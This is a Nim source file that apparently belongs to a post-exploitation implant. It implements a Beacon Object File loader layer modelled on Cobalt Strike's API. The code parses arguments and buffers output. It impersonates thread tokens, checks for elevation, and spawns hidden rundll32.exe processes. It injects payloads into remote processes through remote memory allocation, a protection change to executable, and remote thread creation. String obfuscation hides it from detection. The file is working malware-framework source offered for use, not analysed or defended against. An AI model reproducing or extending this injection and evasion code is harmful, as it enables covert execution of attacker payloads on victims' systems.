import ../../global
import ../../winapi/handlers
import ../../winapi/syscall
import ../../winapi/utils

import ./symbols

{.emit: """
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
typedef struct { char* original; char* buffer; int length; int size; } BOF_DATAP;
N_LIB_PRIVATE N_CDECL(void, bofAppendCString)(NCSTRING text, int size);
""".}

let
  DefaultProcessName = obf("rundll32.exe")
  X64Path = obf("System32")
  X86Path = obf("SysWOW64")
  WindowsRoot = obf("C:\\Windows\\")
  PathSep = obf("\\")

var bofOutputBuffer*: seq[byte]

proc resetBofOutput*() =
  # Clears the bof output buffer
  bofOutputBuffer.setLen(0)

proc bofGetOutputData*(): seq[byte] =
  # Returns the bof output and clears the buffer
  result = bofOutputBuffer
  bofOutputBuffer = @[]

proc swapEndianess*(value: uint32): uint32 =
  # Swaps the byte order when the host is little endian
  var probe = 0xAABBCCDD'u32
  if cast[ptr uint8](addr probe)[] == 0xDD'u8:
    result = ((value and 0x000000FF'u32) shl 24) or
      ((value and 0x0000FF00'u32) shl 8) or
      ((value and 0x00FF0000'u32) shr 8) or
      ((value and 0xFF000000'u32) shr 24)
  else:
    result = value

proc appendRawOutput*(data: pointer; size: int) =
  # Appends raw bytes to the bof output buffer
  if data == nil or size <= 0:
    return
  let start = bofOutputBuffer.len
  bofOutputBuffer.setLen(start + size)
  copyMem(addr bofOutputBuffer[start], data, size)

proc bofAppendCString*(text: cstring; size: cint) {.cdecl, exportc: "bofAppendCString".} =
  # Appends a c string to the bof output
  appendRawOutput(text, size.int)

proc dpOriginal(p: pointer): var cstring =
  # Returns the original buffer field of the parser
  cast[ptr cstring](p)[]
proc dpBuffer(p: pointer): var cstring =
  # Returns the current buffer field of the parser
  cast[ptr cstring](cast[int](p) + 8)[]
proc dpLength(p: pointer): var cint =
  # Returns the remaining length field of the parser
  cast[ptr cint](cast[int](p) + 16)[]
proc dpSize(p: pointer): var cint =
  # Returns the size field of the parser
  cast[ptr cint](cast[int](p) + 20)[]

proc BeaconDataParse*(parser: pointer; buffer: cstring; size: cint) {.cdecl.} =
  # Parses the beacon argument buffer into the parser
  if parser == nil or buffer == nil:
    return
  dpOriginal(parser) = buffer
  dpBuffer(parser) = buffer
  dpLength(parser) = size - 4
  dpSize(parser) = size - 4
  dpBuffer(parser) = cast[cstring](cast[int](buffer) + 4)

proc BeaconDataInt*(parser: pointer): cint {.cdecl.} =
  # Reads a 32 bit integer from the beacon parser
  if parser == nil or dpLength(parser) < 4:
    return 0
  var value: int32
  copyMem(addr value, dpBuffer(parser), sizeof(int32))
  dpBuffer(parser) = cast[cstring](cast[int](dpBuffer(parser)) + 4)
  dpLength(parser) -= 4
  int32(value)

proc BeaconDataShort*(parser: pointer): int16 {.cdecl.} =
  # Reads a 16 bit integer from the beacon parser
  if parser == nil or dpLength(parser) < 2:
    return 0
  var value: int16
  copyMem(addr value, dpBuffer(parser), sizeof(int16))
  dpBuffer(parser) = cast[cstring](cast[int](dpBuffer(parser)) + 2)
  dpLength(parser) -= 2
  value

proc BeaconDataLength*(parser: pointer): cint {.cdecl.} =
  # Returns the remaining length of the beacon parser
  if parser == nil: 0 else: dpLength(parser)

proc BeaconDataExtract*(parser: pointer; size: ptr cint): cstring {.cdecl.} =
  # Extracts a length prefixed blob from the beacon parser
  if parser == nil or dpLength(parser) < 4:
    return nil
  var length: uint32
  copyMem(addr length, dpBuffer(parser), sizeof(uint32))
  dpBuffer(parser) = cast[cstring](cast[int](dpBuffer(parser)) + 4)
  let outdata = dpBuffer(parser)
  dpLength(parser) -= 4
  dpLength(parser) -= cint(length)
  dpBuffer(parser) = cast[cstring](cast[int](dpBuffer(parser)) + length.int)
  if size != nil:
    size[] = cint(length)
  outdata

proc BeaconFormatAlloc*(format: pointer; maxsz: cint) {.cdecl.} =
  # Allocates a beacon format buffer
  if format == nil:
    return
  dpOriginal(format) = cast[cstring](alloc0(maxsz))
  dpBuffer(format) = dpOriginal(format)
  dpLength(format) = 0
  dpSize(format) = maxsz

proc BeaconFormatReset*(format: pointer) {.cdecl.} =
  # Clears the beacon format buffer and resets its cursor
  if format == nil or dpOriginal(format) == nil:
    return
  zeroMem(dpOriginal(format), dpSize(format))
  dpBuffer(format) = dpOriginal(format)
  dpLength(format) = dpSize(format)

proc BeaconFormatFree*(format: pointer) {.cdecl.} =
  # Frees the beacon format buffer
  if format == nil:
    return
  if dpOriginal(format) != nil:
    dealloc(dpOriginal(format))
    dpOriginal(format) = nil
  dpBuffer(format) = nil
  dpLength(format) = 0
  dpSize(format) = 0

proc BeaconFormatAppend*(format: pointer; text: cstring; len: cint) {.cdecl.} =
  # Appends raw text to the beacon format buffer
  if format == nil or text == nil:
    return
  copyMem(dpBuffer(format), text, len)
  dpBuffer(format) = cast[cstring](cast[int](dpBuffer(format)) + len)
  dpLength(format) += len

proc BeaconFormatPrintf*(format: pointer; fmt: cstring) {.cdecl, varargs.} =
  # Formats a string into the beacon format buffer
  if format == nil or fmt == nil:
    return
  {.emit: """
  {
    BOF_DATAP *format = (BOF_DATAP*)`format`;
    va_list ap;
    va_start(ap, `fmt`);
    int needed = vsnprintf(NULL, 0, `fmt`, ap);
    if (needed > 0 && format->length + needed <= format->size) {
      va_list ap2;
      va_copy(ap2, ap);
      vsnprintf(format->buffer, (size_t)needed + 1, `fmt`, ap2);
      va_end(ap2);
      format->buffer += needed;
      format->length += needed;
    }
    va_end(ap);
  }
  """.}

proc BeaconFormatToString*(format: pointer; size: ptr cint): cstring {.cdecl.} =
  # Returns the beacon format buffer as a c string
  if format == nil or dpOriginal(format) == nil:
    return nil
  if size != nil:
    size[] = dpLength(format)
  return dpOriginal(format)

proc BeaconFormatInt*(format: pointer; value: cint) {.cdecl.} =
  # Writes a big endian integer into the beacon format buffer
  if format == nil or dpLength(format) + 4 > dpSize(format):
    return
  var outdata = swapEndianess(uint32(value))
  copyMem(dpBuffer(format), addr outdata, sizeof(uint32))
  dpLength(format) += 4
  dpBuffer(format) = cast[cstring](cast[int](dpBuffer(format)) + 4)

proc BeaconPrintf*(btype: cint; fmt: cstring) {.cdecl, varargs.} =
  # Formats a string and appends it to the bof output
  discard btype
  if fmt == nil:
    return
  {.emit: """
  {
    va_list ap;
    va_start(ap, `fmt`);
    int needed = vsnprintf(NULL, 0, `fmt`, ap);
    if (needed > 0) {
      char stackbuf[512];
      char *buf = stackbuf;
      if (needed + 1 > (int)sizeof(stackbuf)) {
        buf = (char*)malloc((size_t)needed + 1);
        if (!buf) {
          va_end(ap);
          return;
        }
      }
      va_list ap2;
      va_copy(ap2, ap);
      vsnprintf(buf, (size_t)needed + 1, `fmt`, ap2);
      va_end(ap2);
      bofAppendCString((NCSTRING)buf, needed);
      if (buf != stackbuf) {
        free(buf);
      }
    }
    va_end(ap);
  }
  """.}

proc BeaconOutput*(btype: cint; data: cstring; len: cint) {.cdecl.} =
  # Appends raw data to the bof output
  discard btype
  appendRawOutput(data, len.int)

proc BeaconUseToken*(token: pointer): culong {.cdecl.} =
  # Applies the given token to the current thread
  discard setThreadToken(nil, token)
  1

proc BeaconRevertToken*() {.cdecl.} =
  # Reverts the current thread token
  discard revertToSelf()

proc BeaconIsAdmin*(): culong {.cdecl.} =
  # Checks that the current process token is elevated
  const tokenElevationClass = 20'u32
  const tokenIntegrityClass = 25'u32
  const mandatoryHighRid = 0x3000'u32
  type TokenElevation = object
    tokenIsElevated: culong
  type SidAndAttributes = object
    sid: pointer
    attributes: culong
  type MandatoryLabel = object
    label: SidAndAttributes
  var token: pointer = nil
  if openProcessToken(currentProcess, 0x0008'u32, addr token) != 0:
    return 0
  defer:
    discard ntCloseHandle(token)
  var need: culong = 0
  discard queryInformationToken(token, tokenIntegrityClass, nil, 0, addr need)
  if need > 0:
    var intBuf = newSeq[byte](need.int)
    if queryInformationToken(token, tokenIntegrityClass, addr intBuf[0], need, addr need) == 0:
      let label = cast[ptr MandatoryLabel](addr intBuf[0])
      let cnt = getSidSubAuthorityCount(label.label.sid)
      if cnt != nil and cnt[] > 0:
        let sub = getSidSubAuthority(label.label.sid, culong(cnt[] - 1))
        if sub != nil and sub[] >= mandatoryHighRid:
          return culong(1)
  need = 0
  if queryInformationToken(token, tokenElevationClass, nil, 0, addr need) != 0:
    return 0
  var buf = newSeq[byte](need.int)
  if queryInformationToken(token, tokenElevationClass, addr buf[0], need, addr need) != 0:
    return 0
  let elev = cast[ptr TokenElevation](addr buf[0])
  if elev.tokenIsElevated != 0:
    return culong(1)
  return culong(0)

proc BeaconGetSpawnTo*(x86: culong; buffer: cstring; length: cint) {.cdecl.} =
  # Writes the default spawn path into the buffer
  if buffer == nil:
    return
  let path =
    if x86 != 0:
      WindowsRoot & X86Path & PathSep & DefaultProcessName
    else:
      WindowsRoot & X64Path & PathSep & DefaultProcessName
  if path.len > length:
    return
  copyMem(buffer, path.cstring, path.len)

proc BeaconSpawnTemporaryProcess*(
  x86: culong,
  ignoreToken: culong,
  sInfo: ptr STARTUPINFOA,
  pInfo: ptr PROCESS_INFORMATION,
): culong {.cdecl.} =
  # Spawns a temporary process for later injection
  discard ignoreToken
  var cmd =
    if x86 != 0:
      WindowsRoot & X86Path & PathSep & DefaultProcessName
    else:
      WindowsRoot & X64Path & PathSep & DefaultProcessName
  createProcessA(nil, cast[pointer](addr cmd[0]), nil, nil, 1, CREATE_NO_WINDOW, nil, nil, cast[pointer](sInfo), cast[pointer](pInfo))

proc BeaconInjectProcess*(
  hProc: pointer,
  pid: cint,
  payload: cstring,
  pLen: cint,
  pOffset: cint,
  arg: cstring,
  aLen: cint,
) {.cdecl.} =
  # Injects a payload into a target process
  if pLen <= 0 or payload == nil:
    return
  var targetH = hProc
  var closeProc = false
  if targetH == nil:
    if pid == 0:
      return
    targetH = openProcess(culong(pid))
    if targetH == nil:
      return
    closeProc = true
  var st: culong = 0
  let base = virtualAllocEx(targetH, nil, pLen.csize_t, 0x3000'u32, 0x04'u32, addr st)
  if base == nil:
    if closeProc: discard ntCloseHandle(targetH)
    return
  if writeVirtualMemory(targetH, base, cast[pointer](payload), pLen.csize_t) != 0:
    if closeProc: discard ntCloseHandle(targetH)
    return
  var region = pLen.csize_t
  var old: culong = 0
  var allocBase = base
  if protectVirtualMemory(targetH, addr allocBase, addr region, PAGE_EXECUTE_READ, addr old) != 0:
    if closeProc: discard ntCloseHandle(targetH)
    return
  var remoteArg: pointer = nil
  if aLen > 0 and arg != nil:
    remoteArg = virtualAllocEx(targetH, nil, aLen.csize_t, 0x3000'u32, 0x04'u32, addr st)
    if remoteArg == nil:
      if closeProc: discard ntCloseHandle(targetH)
      return
    if writeVirtualMemory(targetH, remoteArg, cast[pointer](arg), aLen.csize_t) != 0:
      if closeProc: discard ntCloseHandle(targetH)
      return
  var start = base
  if pOffset > 0:
    start = cast[pointer](cast[uint](base) + uint(pOffset))
  discard createThreadEx(targetH, start, remoteArg)
  if closeProc: discard ntCloseHandle(targetH)

proc BeaconInjectTemporaryProcess*(
  pInfo: ptr PROCESS_INFORMATION,
  payload: cstring,
  pLen: cint,
  pOffset: cint,
  arg: cstring,
  aLen: cint,
) {.cdecl.} =
  # Injects a payload into a temporary process
  if pInfo == nil or pLen <= 0 or payload == nil:
    return
  var st: culong = 0
  let base = virtualAllocEx(pInfo.hProcess, nil, pLen.csize_t, 0x3000'u32, 0x04'u32, addr st)
  if base == nil:
    return
  if writeVirtualMemory(pInfo.hProcess, base, cast[pointer](payload), pLen.csize_t) != 0:
    return
  var region = pLen.csize_t
  var old: culong = 0
  var allocBase = base
  if protectVirtualMemory(pInfo.hProcess, addr allocBase, addr region, PAGE_EXECUTE_READ, addr old) != 0:
    return
  var remoteArg: pointer = nil
  if aLen > 0 and arg != nil:
    remoteArg = virtualAllocEx(pInfo.hProcess, nil, aLen.csize_t, 0x3000'u32, 0x04'u32, addr st)
    if remoteArg == nil:
      return
    if writeVirtualMemory(pInfo.hProcess, remoteArg, cast[pointer](arg), aLen.csize_t) != 0:
      return
  var start = base
  if pOffset > 0:
    start = cast[pointer](cast[uint](base) + uint(pOffset))
  discard createThreadEx(pInfo.hProcess, start, remoteArg)

proc BeaconCleanupProcess*(pInfo: ptr PROCESS_INFORMATION) {.cdecl.} =
  # Closes the process and thread handles
  if pInfo == nil:
    return
  if pInfo.hThread != nil:
    discard ntCloseHandle(pInfo.hThread)
  if pInfo.hProcess != nil:
    discard ntCloseHandle(pInfo.hProcess)

proc toWideChar*(src: cstring; dst: ptr uint16; max: cint): culong {.cdecl.} =
  # Converts a multibyte string to wide characters
  if max < cint(sizeof(uint16)):
    return 0
  let written = multiByteToWideChar(
    CP_ACP,
    MB_ERR_INVALID_CHARS,
    src,
    -1'i32,
    cast[pointer](dst),
    max div cint(sizeof(uint16)),
  )
  if written > 0:
    1
  else:
    0

proc bofLoadLibraryA*(lib: cstring): pointer {.cdecl.} =
  # Loads a library by name
  loadLibraryA($lib)

proc bofGetProcAddress*(hMod: pointer; name: cstring): pointer {.cdecl.} =
  # Returns the address of an exported function
  getProcAddress(hMod, $name)

proc bofGetModuleHandleA*(name: cstring): pointer {.cdecl.} =
  # Returns the handle of a loaded module
  if name == nil:
    getModuleHandleA(currentModule = true)
  else:
    getModuleHandleA($name)

proc bofFreeLibrary*(hMod: pointer): culong {.cdecl.} =
  # Frees a loaded library
  freeLibrary(hMod)

proc resolveInternalApi(funcName: string): pointer =
  # Finds the address of a built in beacon api
  if funcName == obf("BeaconDataParse"): return cast[pointer](BeaconDataParse)
  if funcName == obf("BeaconDataInt"): return cast[pointer](BeaconDataInt)
  if funcName == obf("BeaconDataShort"): return cast[pointer](BeaconDataShort)
  if funcName == obf("BeaconDataLength"): return cast[pointer](BeaconDataLength)
  if funcName == obf("BeaconDataExtract"): return cast[pointer](BeaconDataExtract)
  if funcName == obf("BeaconFormatAlloc"): return cast[pointer](BeaconFormatAlloc)
  if funcName == obf("BeaconFormatReset"): return cast[pointer](BeaconFormatReset)
  if funcName == obf("BeaconFormatFree"): return cast[pointer](BeaconFormatFree)
  if funcName == obf("BeaconFormatAppend"): return cast[pointer](BeaconFormatAppend)
  if funcName == obf("BeaconFormatPrintf"): return cast[pointer](BeaconFormatPrintf)
  if funcName == obf("BeaconFormatToString"): return cast[pointer](BeaconFormatToString)
  if funcName == obf("BeaconFormatInt"): return cast[pointer](BeaconFormatInt)
  if funcName == obf("BeaconPrintf"): return cast[pointer](BeaconPrintf)
  if funcName == obf("BeaconOutput"): return cast[pointer](BeaconOutput)
  if funcName == obf("BeaconUseToken"): return cast[pointer](BeaconUseToken)
  if funcName == obf("BeaconRevertToken"): return cast[pointer](BeaconRevertToken)
  if funcName == obf("BeaconIsAdmin"): return cast[pointer](BeaconIsAdmin)
  if funcName == obf("BeaconGetSpawnTo"): return cast[pointer](BeaconGetSpawnTo)
  if funcName == obf("BeaconSpawnTemporaryProcess"): return cast[pointer](BeaconSpawnTemporaryProcess)
  if funcName == obf("BeaconInjectProcess"): return cast[pointer](BeaconInjectProcess)
  if funcName == obf("BeaconInjectTemporaryProcess"): return cast[pointer](BeaconInjectTemporaryProcess)
  if funcName == obf("BeaconCleanupProcess"): return cast[pointer](BeaconCleanupProcess)
  if funcName == obf("toWideChar"): return cast[pointer](toWideChar)
  if funcName == obf("LoadLibraryA"): return cast[pointer](bofLoadLibraryA)
  if funcName == obf("GetProcAddress"): return cast[pointer](bofGetProcAddress)
  if funcName == obf("GetModuleHandleA"): return cast[pointer](bofGetModuleHandleA)
  if funcName == obf("FreeLibrary"): return cast[pointer](bofFreeLibrary)
  nil

proc resolveBofExternal*(symbol: string): pointer =
  # Resolves a bof external symbol to an address
  let cSpecificHandler = obf("__C_specific_handler")
  if symbol == cSpecificHandler:
    return getProcAddress(getModuleHandleA(obf("kernel32.dll")), cSpecificHandler)

  let (_, funcName) = parseImportSymbol(symbol)
  if funcName.len > 0:
    let internal = resolveInternalApi(funcName)
    if internal != nil:
      return internal

  defaultResolveExternal(symbol)
